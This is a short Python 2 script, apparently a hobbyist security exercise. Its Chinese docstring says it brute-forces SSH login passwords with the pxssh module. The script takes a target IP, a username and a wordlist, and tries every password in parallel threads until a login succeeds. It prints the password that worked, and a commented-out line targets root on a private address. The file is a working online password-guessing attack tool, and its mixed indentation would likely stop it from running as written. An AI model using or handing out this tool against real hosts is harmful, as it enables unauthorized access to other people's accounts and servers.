#coding: utf-8
'''
Author:
       __  _             ________
 ___ _/ /_(_)__ ____ ___/_  /_  /
/ _ `/ __/ / _ `/ -_) __// / / /
\_,_/\__/_/\_, /\__/_/  /_/ /_/
          /___/
Date:20170131
Desc:使用pxssh模块暴力破解SSH服务登录密码

'''

from pexpect import pxssh
import optparse,time,threading

#设置最大连接数
maxConnections = 5
#设置计数线程同步的数值
connection_lock = threading.BoundedSemaphore(value=maxConnections)
#设置默认匹配情况
Found = False
#设置默认失败数
Fails = 0

def connect(host,user,password,release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
	s.login(host,user,password)
        print '[+] Password Found: ' + password
        Found = True
    except Exception,e:
	if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        if release: connection_lock.release()        


def main():
    parser = optparse.OptionParser("usage  -H <target ipaddr> -U <user> -F <password list>")
    parser.add_option('-H',dest='tgtHost',type='string',help='specify target ipaddr')

    parser.add_option('-U',dest='user',type='string',help='specify target user')
    parser.add_option('-F',dest='passwdFile',type='string',help='specify passwd file')
    (options,args) = parser.parse_args()
    host  = options.tgtHost
    user  = options.user
    passwdfile  = options.passwdFile
    
    if host == None  or user == None or passwdfile == None:
        print parser.usage
        exit(0)
    
    fn = open(passwdfile,'r')
    lines = fn.readlines()
    for line in lines:
        if Found:
            print "[*] Exiting: Password Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too many socket timeouts"
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        t = threading.Thread(target=connect,args=(host,user,password,True)) 
        t.start()  


if __name__ == '__main__':
    #connect('172.16.56.132','root','123456','True')
    main()
